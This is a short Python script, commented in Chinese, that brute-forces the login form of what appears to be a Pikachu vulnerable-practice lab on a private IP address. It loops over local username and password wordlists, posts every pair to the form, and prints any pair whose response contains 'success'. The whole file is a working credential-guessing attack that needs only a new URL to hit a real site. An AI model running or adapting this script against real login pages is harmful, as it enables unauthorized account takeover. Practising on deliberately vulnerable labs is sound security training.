import time

import requests
'''
动态内容：有些网站可能使用JavaScript来动态加载内容，
而Python的requests库不会执行JavaScript。这可能导致Python请求的响应结果不同于在浏览器中看到的结果。
解决方法：如果网站使用了动态加载内容，您可以考虑使用Selenium等工具来模拟浏览器的行为，以获取完整的响应结果。
'''

url = 'http://192.168.110.34/pikachu/vul/burteforce/bf_form.php'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}
for username in open('E:\Sec\Tools\字典\\vikingarDict\\username_passwd\\username.txt'):
    for password in open('E:\Sec\Tools\字典\\vikingarDict\\username_passwd\\password.txt'):
        data = {
            'username': username,
            'password': password
        }
        res = requests.post(url=url, headers=headers, data=data).content.decode('utf-8')
        # print('当前测试用户名密码为  ' + username + ' ' + password)
        # time.sleep(0.1)
        if 'success' in res:
            print('用户名密码为  ' + username + ':' + password)
